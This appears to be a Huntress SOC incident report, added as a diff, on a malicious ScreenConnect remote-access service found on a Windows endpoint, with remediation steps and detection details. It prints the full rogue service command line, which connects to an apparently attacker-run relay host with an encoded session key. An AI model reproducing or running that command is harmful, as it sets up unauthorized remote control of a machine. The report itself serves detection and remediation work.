@@ -1,0 +1,25 @@
+Investigative Summary
+---------------------
+At 2025-07-22 20:00:49 UTC, a malicious Windows Service with the name "ScreenConnect Client (5a8531f6-7919-4d50-bc4d-c90791caa79d)" was detected on the endpoint. This activity occurred prior to Huntress deployment.
+
+Threat Descriptions:
+-------------------
+Malware Artifact: A Malware Artifact is a piece of evidence left behind by malware on a computer system. It could be a file, registry entry, or network connection that indicates the presence of malicious activity.
+
+Remediations:
+-------------
+Assisted Remediations provided by the Huntress SOC to remediate the incident. These can be executed automatically in the Huntress Platform:
+- Delete Service - name: ScreenConnect Client (5a8531f6-7919-4d50-bc4d-c90791caa79d)
+- Delete Registry Key - key: HKLM\SYSTEM\CurrentControlSet\Services\ScreenConnect Client (5a8531f6-7919-4d50-bc4d-c90791caa79d)
+- Reboot the Host - remediation: A reboot is required to complete the remediation plan + name:  + parameters: 
+
+All remediations provided can be found in the Huntress Platform: Incident Report: https://tabinc.huntress.io/org/498557/infection_reports/1610944#remediations-tab
+
+Lead Signal Information
+-----------------------
+Signal Name: Screenconnect Url Not Hosted
+Detected At: 2025-07-22 20:00:16 UTC
+Service Display Name: ScreenConnect Client (5a8531f6-7919-4d50-bc4d-c90791caa79d)
+Service Name: ScreenConnect Client (5a8531f6-7919-4d50-bc4d-c90791caa79d)
+Command: "C:\Users\bdalene\AppData\Local\Apps\2.0\MBMPKYGJ.T7M\BC39BDN8.TZ4\scre..tion_25b0fbb6ef7eb094_0018.0004_38920ff64b8ada3a\ScreenConnect.ClientService.exe" "?e=Support&y=Guest&h=hingreso.olhelp.top&p=8880&s=5a8531f6-7919-4d50-bc4d-c90791caa79d&k=BgIAAACkAABSU0ExAAgAAAEAAQDZYOWnHtGZWepDr%2fXq1T4hp8LQrTWetWMlIdLjagmij7kfDlF3zv7qA8CfszvXj%2fTLPVxBB%2fD0EqXSRsAbW57iAY0cX%2b%2bJJIMZ9PV3bCrRmp%2bmL7UCqq0S3dW%2fcfwn27OjJrpDFSmh6R%2bYzMy%2fL79IezUFj37w6ry6wQrUNoREV65znmggFugU2T%2bdxQeY%2fnhMuRy2jBPjPM7KnxnBGRH27TlDrlMkKOc0LFPlubkoxcm11nYpRweqgRt34ghARPoKu1TevTvD3%2bpjHd8i3I3qniei55p0bH9X36eBqp61f7%2bbVPEPU7VwZhmBS9yvjXADKoS6SDx9PcndtVbN1mmv&v=AQAAANCMnd8BFdERjHoAwE%2fCl%2bsBAAAA5WgCkZUexEuNteBhR5WzkQAAAAACAAAAAAAQZgAAAAEAACAAAACYgWAJ%2blPUwDQg%2babSP8wxMiMpMHi%2ficJu9HesFdblCwAAAAAOgAAAAAIAACAAAABBnmoC1xaFFqlwjXBLarSUlNCx%2ffcT76LHfF%2bRWVBG5KAEAACg%2f9E%2fFXIIdUgh%2fyck9QN1QpuzCRJZviahMsRJqiy7QJ0CK3ofVhJx%2bXoSSh1zfAxBWmDXOSyjoIHD8LKspTkp0KSFGTan%2bEfVLGEJNRKe9XI%2fBCrUyxUAs6dhkatYsR6ziscWgWzZbkI41JJT9SKaFcIItUnFDP9vui%2bvUerfkWkPeoWlmBVrnTL2dL2DRwgomwGxxiQYPmd46uw4ejYLacJ%2bN3%2ft6B7J7WgMsc6OUiQ%2fAfwJIIVDlOBlN0Ckyo%2fBdFKEeqMPQnMA2cXoVCmsMgYzD4lWsEwWd1HBxNifRWlmSreCOTyptGUOeSM%2fyDWKFOBNz3kOHSsrDqj8rWeR71wNFbo9GMkN%2fobxK06jZ4IknmNuLfJe5NxjtE%2fBLA42tnLUL8dNYlv6nGUiOEEZm%2fzFNvQKspcLpjBH9aI1eH60OGRgrjTx0xS28UqWHtU9o0oZ7%2fcN%2fI7p2E928rmVj5RtuFDY8wcTF%2bflJyFu6gT46CnJanVtQ%2fzZtGcGY%2bYsYdE%2byq4ufkp%2fbcV5t79xgSHVlOw2g0ST1bGBUeCBHX6XBizInoq4nCbxcsQ70JTQoeY9GkEIiaLwFrK1DqBEyidr%2fQCXuA4qfLwhILi6J4IWtVsA8gm5fBOBxHeSKYWvrlsnxZzmqrexkDdYFrgshFT2C9fnh%2fHylfsLIOKLJtvRH4rEvav23MMzu6Al5CD8mVu7O6ePtfPCqSPogq7mG3b%2bMRCIa%2fwfjh%2bvzwlx1jCm%2f3N1nrlOi4fAd2vbbMHq72iN46aaqbYfreoWb6tzDQO3Nd92s%2fJVfv8o5gXSDOutNw3jjpw46elc%2bIgw29fc3%2fadRVxVfB6eJhfHI64kHE2orHmND%2fIKTWw%2fN7v6bnOxcbbit1A7IhEUzrsVQyC2c0RoClp%2fKd7kQ2OwuhHG4lZWasv8Darb5UHm2rnvfaN0w44S%2fNEUTpQ6a%2fTLnQa8Cc3YJOig%2b1BMF4EI4siIcn7kYquTNCI2JqZ0zMMgvMEJYZpQFTvi05VjnT8Lz2qT5P4u4jOJNHn7pWxUAdnhLzgpJpWAVaz%2boqx9NhfxRrmEw9yGdwueP9Ot%2bkcDzbvUgG7%2bfD1SI0Quq7oUp0M%2bQZs4fwiBKucvAHLSlEGCwPnaMkb194iC14BFL69uZ5tvsXzQm8G8rXLoEeEMBcBKPOtB%2fa%2ffCAYVj51jEaFBjkl3eInbi2cve03o3grh1JlixnGyQToFli3HRtQqgNbH5%2fPcsDCnybeF6Qopblz8S1JpPwTxvxqktT2yqflt9keG4Rh%2fwwT1fT5gPOff%2bKGTd3VmGjznY5wXk155ydtleDydXWO6EvOwFtcKwwk56FUehwi8jz8dbRBPOQLb7dgkiBdlF9cL%2bpuF01nSgYG9s59TKdIBFIb4wT3IZF6VimOYGaK1AbliaaFzzffzd4YE4EA5ItnH40n%2b0HuilQA1a1YtLoGtNyX7bXrEETa%2bSz7eVFFe0kFV69aYgsuzgWNgV54Ok3EV6nIUmskJuAU5qJ7EpNKLOGiIpAe%2bRQSOku%2bTZC%2bTYNkFPuAlThpwhmdiFasLyFr0VsBO8CNdS4%2fcw0AAAAAi6YDBxwqsJPPyG83ICdcqNWB%2frphoKuog2z%2fYF8Q63y16E1rk6w%2btigyqWIDbl7g75KeMGgzSZzK2J2kCeAAN&r=&i=f1" "6"
+File Path: 
